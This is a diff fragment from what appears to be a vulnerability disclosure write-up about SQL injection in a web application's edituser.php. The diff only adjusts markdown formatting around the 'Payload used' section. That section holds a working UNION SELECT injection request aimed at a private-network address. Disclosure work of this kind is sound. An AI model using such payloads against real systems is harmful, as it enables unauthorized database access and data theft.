@@ -18,7 +18,8 @@ The reason for the SQL injection vulnerability is that the website application d
 
 #### Payload used:
 
-```GET /edituser.php?id=-7956'%20UNION%20ALL%20SELECT%20NULL,md5(1),NULL,NULL--+ HTTP/1.1
+```
+GET /edituser.php?id=-7956'%20UNION%20ALL%20SELECT%20NULL,md5(1),NULL,NULL--+ HTTP/1.1
 Host: 192.168.67.10:8091
 Cache-Control: max-age=0
 Upgrade-Insecure-Requests: 1
